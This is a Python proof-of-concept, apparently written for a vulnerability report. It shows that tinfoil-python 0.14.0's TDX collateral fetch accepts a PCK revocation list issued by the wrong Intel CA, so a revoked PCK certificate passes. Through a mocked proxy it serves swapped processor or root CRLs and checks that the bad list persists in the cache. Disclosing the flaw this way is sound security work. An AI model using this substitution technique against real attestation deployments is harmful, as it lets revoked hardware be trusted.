"""
Minimal PoC: tinfoil-python 0.14.0 accepts a PCK CRL issued by the wrong Intel CA.

fetch_pck_crl(ca_type) accepts any CRL whose signature verifies under any
Intel-rooted chain carried in the SGX-PCK-CRL-Issuer-Chain response header.
Nothing ties the CRL's issuer to the PCK certificate's issuer.
validate_certificate_revocation() then looks the PCK serial up in whatever
CRL came back.

Inputs: genuine Intel-signed PCS artifacts fetched from api.trustedservices.intel.com
on 2026-10-08 (platform CRL, processor CRL, Root CA CRL, TCB Info, QE Identity and
their issuer-chain headers), Intel's production SPR quote (go-tdx-guest v0.3.1
testdata) for a real Platform-CA PCK chain. Real clock (CRLs valid to 2026-11-07).

Stubs:
  * requests.get -> local stand-in for https://tdx-proxy.tinfoil.sh (attacker position);
  * the revoked PCK certificate itself is not public, so a self-signed stand-in
    carrying a serial taken from Intel's real platform CRL is used for the
    revocation lookup. validate_certificate_revocation() reads only
    pck_cert.serial_number from it (collateral_tdx.py:1950-1951).

Usage: python -I poc_f13.py <data_dir>
"""
import datetime as _dt
import os
import sys
import tempfile
from unittest import mock
from urllib.parse import quote, unquote

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

import tinfoil.attestation.collateral_tdx as ct
from tinfoil.attestation.abi_tdx import parse_quote
from tinfoil.attestation.verify_tdx import extract_pck_cert_chain, verify_pck_chain
from tinfoil.attestation.pck_extensions import extract_pck_extensions

D = sys.argv[1]
rd = lambda n: open(os.path.join(D, n), "rb").read()


def hdr(name, key):
    for line in rd(name).decode().splitlines():
        if line.lower().startswith(key.lower() + ":"):
            return line.split(":", 1)[1].strip()
    raise KeyError(key)


PLATFORM_CRL, PROCESSOR_CRL = rd("pckcrl_platform.pem"), rd("pckcrl_processor.pem")
PLATFORM_CHAIN = hdr("pckcrl_platform.headers", "SGX-PCK-CRL-Issuer-Chain")
PROCESSOR_CHAIN = hdr("pckcrl_processor.headers", "SGX-PCK-CRL-Issuer-Chain")
ROOT_CRL_DER = rd("IntelSGXRootCA.der")
ROOT_CRL_PEM = x509.load_der_x509_crl(ROOT_CRL_DER).public_bytes(serialization.Encoding.PEM)
# [root, root]: the Intel SGX Root CA certificate twice (taken from Intel's own header)
_root_pem = "-----BEGIN CERTIFICATE-----" + unquote(PLATFORM_CHAIN).split("-----BEGIN CERTIFICATE-----")[2]
ROOT_ROOT_CHAIN = quote((_root_pem.strip() + "\n") * 2)
TCB, TCB_CHAIN = rd("tcb_50806f000000_latest.json"), hdr("tcb_50806f000000_latest.headers", "TCB-Info-Issuer-Chain")
QE, QE_CHAIN = rd("qe_identity_latest.json"), hdr("qe_identity_latest.headers", "SGX-Enclave-Identity-Issuer-Chain")
cn = lambda name: name.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value


def proxy(platform_crl, platform_chain):
    """Stand-in for tdx-proxy.tinfoil.sh: everything genuine except the answer to ?ca=platform."""
    def get(url, timeout=None, **kw):
        if not url.startswith("https://tdx-proxy.tinfoil.sh/"):
            raise AssertionError(url)
        r = requests.Response(); r.status_code = 200; r.url = url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = TCB; r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = QE; r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = platform_crl; r.headers["SGX-PCK-CRL-Issuer-Chain"] = platform_chain
        elif url.endswith("/IntelSGXRootCA.der"):
            r._content = ROOT_CRL_DER
        else:
            raise AssertionError(url)
        return r
    return get


def stand_in(serial):
    k = ec.generate_private_key(ec.SECP256R1())
    n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "stand-in for a revoked Platform-CA PCK")])
    now = _dt.datetime.now(_dt.timezone.utc)
    return (x509.CertificateBuilder().subject_name(n).issuer_name(n).public_key(k.public_key()).serial_number(serial)
            .not_valid_before(now - _dt.timedelta(days=1)).not_valid_after(now + _dt.timedelta(days=1))
            .sign(k, hashes.SHA256()))


def main():
    q = parse_quote(rd("quote.dat"))
    chain = extract_pck_cert_chain(q)
    verify_pck_chain(chain)  # real Intel PCK chain -> pinned Intel SGX Root CA
    ext = extract_pck_extensions(chain.pck_cert)
    plat = x509.load_pem_x509_crl(PLATFORM_CRL)
    revoked_serial = list(plat)[0].serial_number
    print("real PCK issuer:", cn(chain.pck_cert.issuer), "| fmspc", ext.fmspc)
    print(f"Intel platform CRL: {len(list(plat))} revoked, nextUpdate {plat.next_update_utc.date()}; "
          f"using revoked serial {revoked_serial:x}")
    pck_revoked = stand_in(revoked_serial)

    res = {}
    scenarios = [
        ("A control: genuine platform CRL + platform chain", PLATFORM_CRL, PLATFORM_CHAIN),
        ("B control: platform CRL + processor chain (bad sig)", PLATFORM_CRL, PROCESSOR_CHAIN),
        ("C attack:  processor CRL + processor chain", PROCESSOR_CRL, PROCESSOR_CHAIN),
        ("D attack:  Root CA CRL + [root, root] chain", ROOT_CRL_PEM, ROOT_ROOT_CHAIN),
    ]
    for label, body, hchain in scenarios:
        with tempfile.TemporaryDirectory() as d, mock.patch.object(ct, "_TDX_CACHE_DIR", d):
            try:
                with mock.patch.object(ct.requests, "get", proxy(body, hchain)):
                    coll = ct.fetch_collateral(ext, chain.pck_cert)          # production fetch path
                got = coll.pck_crl
                fetched = f"fetched as ca_type={got.ca_type!r}, CRL issuer={cn(got.crl.issuer)!r}"
                with mock.patch.object(ct.requests, "get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("net"))):
                    cached = ct.fetch_collateral(ext, chain.pck_cert)          # next session: cache hit, no network
                fetched += f"; cached: {cn(cached.pck_crl.crl.issuer)!r}"
                try:
                    ct.validate_certificate_revocation(coll, pck_revoked, chain.intermediate_cert)
                    verdict = "ACCEPT (revoked PCK not detected)"
                except ct.CollateralError as e:
                    verdict = f"REJECT {e}"
            except ct.CollateralError as e:
                fetched, verdict = "fetch failed", f"REJECT {e}"
        print(f"\n[{label}]\n    {fetched}\n    -> {verdict}")
        res[label[0]] = verdict.split()[0]

    print("\nRESULT:", res)
    ok = res == {"A": "REJECT", "B": "REJECT", "C": "ACCEPT", "D": "ACCEPT"}
    print("matches expected:", ok)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
